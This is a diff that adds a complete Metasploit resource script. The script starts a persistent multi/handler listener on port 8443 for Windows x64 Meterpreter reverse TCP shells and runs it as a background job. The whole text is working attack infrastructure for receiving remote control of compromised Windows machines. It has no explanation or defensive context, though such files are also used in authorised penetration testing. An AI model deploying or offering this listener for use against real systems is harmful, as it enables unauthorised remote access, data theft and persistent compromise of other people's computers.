@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set ExitOnSession false
+set lhost eth0
+set payload windows/x64/meterpreter/reverse_tcp
+set lport 8443
+run -j
